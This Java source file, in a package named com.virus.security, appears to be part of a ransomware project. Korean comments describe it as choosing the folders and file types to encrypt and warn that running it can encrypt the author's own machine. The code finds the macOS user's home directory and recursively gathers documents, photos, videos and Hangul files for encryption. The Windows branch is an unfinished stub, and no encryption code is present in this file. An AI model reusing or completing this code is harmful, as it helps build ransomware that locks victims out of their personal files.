package com.virus.security;

import org.apache.commons.io.FilenameUtils;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by codertimo on 15. 11. 16..
 */
public class SearchDirectory {

    private boolean isWindow;
    private String defaultDirectiory;
    private List<File> allFiles = new ArrayList<>();
    private List<String> containsfilters = new ArrayList<>();
    private int filecounts = 0;

    public SearchDirectory()
    {
        /**
         * !!!주의!!!
         * 암호화 테스트 코드를 실행할 때에는 절대 setDefaultDirectiory()를 사용하여 테스트를 하지 마세요
         * 본인의 컴퓨터가 암호화 될 수 있습니다
         **/



        //1. 암호화 할 경로 설정
//        setDefaultDirectiory("/Users/codertimo/Develop/EncryptionTest/");
        setDefaultDirectiory();

        //2. 암호화할 파일 타입을 설정
        initContainFilter();

        //3.

        System.out.println("디렉토리 검색 시작");
        System.out.println(defaultDirectiory);
        subDirList(defaultDirectiory);
        System.out.println("디렉토리 검색 끝");
    }

    /**
     * 암호화할 코드
     */
    private void initContainFilter()
    {
        containsfilters.add("jpg");
        containsfilters.add("docx");
        containsfilters.add("hwp");
        containsfilters.add("pptx");
        containsfilters.add("ppt");
        containsfilters.add("avi");
        containsfilters.add("mp4");
        containsfilters.add("mkv");
        containsfilters.add("max");
        containsfilters.add("cad");
    }

    /**
     * OS별 최상위 디렉토리 설정
     */
    private void setDefaultDirectiory()
    {
        String os = System.getProperty("os.name").split(" ")[0];
        switch (os)
        {
            case "Mac":
                isWindow = false;
                setMacDefaultDirectiory();
                break;

            case "Window":
                isWindow = true;
                setWindowDefaultDirectory();
                break;

            default:
                isWindow = false;
        }
    }

    /**
     * 최상위 디렉토리 사용자 설정
     * @param defaultDirectiory
     */
    private void setDefaultDirectiory(String defaultDirectiory)
    {
        this.defaultDirectiory = defaultDirectiory;
    }
    /**
     * 기본 디렉토리 설정 : Mac 용
     */
    private void setMacDefaultDirectiory()
    {
        File macDir = new File("/Users/");
        File[] fileList = macDir.listFiles();
        try {
            for (File file : fileList) {
                System.out.println(file.getName());
                if (!file.getName().equals("Guest") && !file.getName().equals("Shared")) {
                    this.defaultDirectiory = file.getCanonicalPath().toString();
                }
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }


    /**
     *  기본 디렉토리 설정 : Window용
     *  **** 강희룡이 할것 *****
     */
    private void setWindowDefaultDirectory()
    {
        File windowDir = new File("??");
        File[] fileList = windowDir.listFiles();
        try {
            for (File file : fileList) {
                if (file.getName() != "???" && file.getName() != "???") {
                    this.defaultDirectiory = file.getCanonicalPath().toString();
                }
            }
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
    }


    /**
     * souce에 주어진 경로에 있는 모든 파일을 훑음, 또한 하위 디렉토리 존재시, 재귀로 다시 호출
     * @param source
     */
    private void subDirList(String source){
        File dir = new File(source);
        File[] fileList = dir.listFiles();
        try{
            for(File file : fileList){
                if(file.isFile()){
                    filecounts+=1;
                    // 파일이 있다면 파일 추가
                    if(isAvalableFile(file)) {
                        allFiles.add(file);
                        System.out.println(file.getName());
                    }
                }
                else if(file.isDirectory())
                {
                    // 서브디렉토리가 존재하면 재귀적 방법으로 다시 탐색
                    subDirList(file.getCanonicalPath().toString());
                }
            }
        }
        catch(Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 필터에 부합하는 파일인지 확인
     * @param file
     * @return
     */
    private boolean isAvalableFile(File file)
    {
        if(this.containsfilters.contains(FilenameUtils.getExtension(file.getName())))
        {
            return true;
        }
        return false;
    }

}
